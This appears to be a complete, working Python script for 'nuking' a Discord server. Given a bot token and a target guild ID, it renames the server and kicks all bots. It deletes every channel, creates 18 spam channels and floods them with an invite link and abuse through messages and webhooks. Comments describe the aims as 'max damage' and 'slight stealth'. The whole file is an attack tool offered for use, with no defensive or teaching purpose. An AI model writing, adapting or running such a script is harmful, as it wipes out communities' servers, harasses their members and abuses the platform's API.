import asyncio
import aiohttp
import random

TOKEN = "my_Stinky_Little_Skid_Bot_Token" # Discord Bot Token, DON'T share!
GUILD_ID = 123456789 # Target Server ID

NUKE_CHANNEL_NAME = "ZSHG FUCKED YOU" # Name for spam channels, change as needed
NUKE_SERVER_NAME = "ZSHG OWNS YOU"    # Server name post-nuke, change as needed
NUKE_SPAM_LINK = "https://discord.gg/j9dwnCrA" # Link to spam in messages, just used the link u said.
NUKE_SPAM_MESSAGE = f"{NUKE_SPAM_LINK}\nZSHG OWNS YOU" # Spam message for normal channels
WEBHOOK_SPAM_MESSAGE = f"ZSHG OWNS YOU\n{NUKE_SPAM_LINK}" # Spam message for webhooks. Dont edit past the "U"

API_BASE = "https://discord.com/api/v10" # Using latest Discord API version

def get_headers():
    # Gen headers for requests, User-Agent randomized for slight stealth. SEE: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/User-Agent
    return {
        "Authorization": f"Bot {TOKEN}",
        "Content-Type": "application/json",
        "User-Agent": f"DiscordBot ({random.randint(1000,9999)})"
    } # Small layer of stealth

async def api_call(session, method, endpoint, json=None):
    # Core HTTP wrapper for all API calls, returns parsed JSON or None
    url = f"{API_BASE}{endpoint}"
    async with session.request(method, url, headers=get_headers(), json=json) as response:
        if response.content_length == 0:
            return None
        try:
            return await response.json(content_type=None)
        except Exception:
            return None # Failsafe for weird responses

async def kick_all_bots(session, guild_id):
    # Removes ALL bots from server. Uses pagination for >1000 members.
    members = []
    after = None
    while True:
        endpoint = f"/guilds/{guild_id}/members?limit=1000"
        if after:
            endpoint += f"&after={after}"
        res = await api_call(session, "GET", endpoint)
        if not res or not isinstance(res, list):
            break # Exit if no members fetched
        members.extend(res)
        if len(res) < 1000:
            break # End if we're out of pages
        after = res[-1]["user"]["id"]
    bots = [m["user"]["id"] for m in members if m.get("user", {}).get("bot")]
    if bots:
        # Batch kick all bots with DELETE requests
        tasks = [api_call(session, "DELETE", f"/guilds/{guild_id}/members/{bot_id}") for bot_id in bots]
        await asyncio.gather(*tasks, return_exceptions=True)

async def nuke_webhooks(session, channels):
    # Deletes all webhooks from provided channel list
    delete_tasks = []
    for ch in channels:
        wh_list = await api_call(session, "GET", f"/channels/{ch['id']}/webhooks")
        if wh_list and isinstance(wh_list, list):
            for wh in wh_list:
                delete_tasks.append(api_call(session, "DELETE", f"/webhooks/{wh['id']}"))
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)

async def spam_webhooks(session, channels):
    # Creates webhooks in each channel & spams messages with em
    spam_tasks = []
    for ch in channels:
        wh = await api_call(session, "POST", f"/channels/{ch['id']}/webhooks", {"name": "zshg"})
        if wh and "id" in wh and "token" in wh:
            wh_url = f"https://discord.com/api/webhooks/{wh['id']}/{wh['token']}"
            for _ in range(30):
                spam_tasks.append(session.post(wh_url, json={"content": WEBHOOK_SPAM_MESSAGE}))
    if spam_tasks:
        await asyncio.gather(*spam_tasks, return_exceptions=True)

async def nuke_server():
    # Full sequence.
    async with aiohttp.ClientSession() as session:
        await api_call(session, "PATCH", f"/guilds/{GUILD_ID}", {"name": NUKE_SERVER_NAME}) # Rename server
        await kick_all_bots(session, GUILD_ID) # Kick all bots for max damage
        channels = await api_call(session, "GET", f"/guilds/{GUILD_ID}/channels") # Get all channels
        if not channels or not isinstance(channels, list):
            channels = [] # Defensive fallback
        # Delete all channels
        delete_tasks = [api_call(session, "DELETE", f"/channels/{ch['id']}") for ch in channels]
        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)
        # Rapidly create spam channels
        create_tasks = [api_call(session, "POST", f"/guilds/{GUILD_ID}/channels", {"name": NUKE_CHANNEL_NAME, "type": 0}) for _ in range(18)]
        results = await asyncio.gather(*create_tasks, return_exceptions=True)
        created_ids = [r["id"] for r in results if r and isinstance(r, dict) and "id" in r]
        # Spam messages in every created channel
        spam_tasks = []
        for ch_id in created_ids:
            for _ in range(60):
                spam_tasks.append(api_call(session, "POST", f"/channels/{ch_id}/messages", {"content": NUKE_SPAM_MESSAGE}))
        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        # Spam Webhooks for more effect 
        wh_channels = [{"id": cid} for cid in created_ids]
        await spam_webhooks(session, wh_channels)
        await nuke_webhooks(session, wh_channels) # Clean  webhooks after spam

if __name__ == "__main__": # FIXED
    asyncio.run(nuke_server())
